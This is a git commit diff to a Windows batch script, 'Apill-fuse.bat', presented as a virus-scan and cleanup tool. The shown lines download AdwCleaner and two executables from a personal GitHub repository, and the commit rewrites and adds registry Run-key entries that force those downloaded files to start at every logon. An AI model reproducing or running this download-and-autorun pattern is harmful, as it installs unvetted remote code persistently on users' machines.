6b1f23c425908f875aac12d12f5ddd4b3323f09d
rrpt66 <158460098+rrpt66@users.noreply.github.com>
2024-03-04 19:20:43 +0700

    Update Apill-fuse.bat

--- Apill-fuse.bat
+++ Apill-fuse.bat
@@ -147,7 +147,9 @@ echo install.........
 powershell.exe Invoke-WebRequest -Uri "https://adwcleaner.malwarebytes.com/adwcleaner?channel=release" -OutFile "C:\startup\adw.exe"
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan.exe" -OutFile "C:\startup\Scan.exe"
 C:\startup\adw.exe /preinstalled
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "C:\startup\Scan.exe"
+
+Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "(Default2)" /t REG_SZ /d "C:\startup\Scan.exe" /f
+cls
 set /p wda=" start scan virus yes or no? > "
 if %wda%== yes goto :adw
 if %wda%== no goto :menu
@@ -592,7 +594,7 @@ cls
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.exe" -OutFile "Clear.exe"
 mkdir C:\startup
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.exe" -OutFile "C:\startup\Clear.exe"
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "C:\startup\Clear.exe"
+Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "(Default)" /t REG_SZ /d "C:\startup\Clear.exe" /f
 Clear.exe /k
 ping -n 4.5 127.0.0.1>nul
 cls
